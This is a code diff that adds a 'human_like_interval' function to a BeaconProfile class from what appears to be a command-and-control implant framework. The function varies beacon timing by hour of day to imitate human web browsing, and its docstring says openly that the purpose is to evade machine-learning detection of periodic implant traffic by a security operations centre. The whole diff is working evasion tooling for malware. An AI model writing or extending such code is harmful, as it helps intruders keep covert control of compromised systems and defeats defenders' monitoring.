@@ -16,7 +16,7 @@ from __future__ import annotations
 
 import random
 
-__all__ = ["BeaconProfile"]
+__all__ = ["BeaconProfile", "human_like_interval"]
 
 
 class BeaconProfile:
@@ -103,3 +103,37 @@ class BeaconProfile:
     def reset(self) -> None:
         """Explicitly reset to the base level (e.g. on (re)connect)."""
         self._current = self.base
+
+
+def human_like_interval(base: float, hour: int | None = None) -> float:
+    """Produce a beacon interval that mimics human web browsing patterns.
+
+    Business hours (8-18): shorter intervals, higher variance (active use).
+    Evening (19-23): medium intervals (background tabs, occasional use).
+    Night (0-7): long intervals (device asleep, no user traffic).
+
+    The returned value is *additional* wait time beyond the base. Callers
+    should add this to their normal beacon interval for ML detection evasion.
+    A SOC analysing netflow with a Gaussian mixture model sees what looks
+    like user browsing, not a periodic implant.
+
+    Parameters
+    ----------
+    base : float
+        Minimum interval (seconds). The result is never less than this.
+    hour : int or None
+        Hour of day (0-23). If None, uses the current local hour.
+    """
+    import datetime
+    import math
+
+    if hour is None:
+        hour = datetime.datetime.now().hour
+
+    rng = random.Random()
+    if 8 <= hour <= 18:
+        return max(base, rng.gauss(15.0, 8.0))
+    elif 19 <= hour <= 23:
+        return max(base * 2, rng.gauss(45.0, 15.0))
+    else:
+        return max(base * 4, rng.gauss(300.0, 60.0))
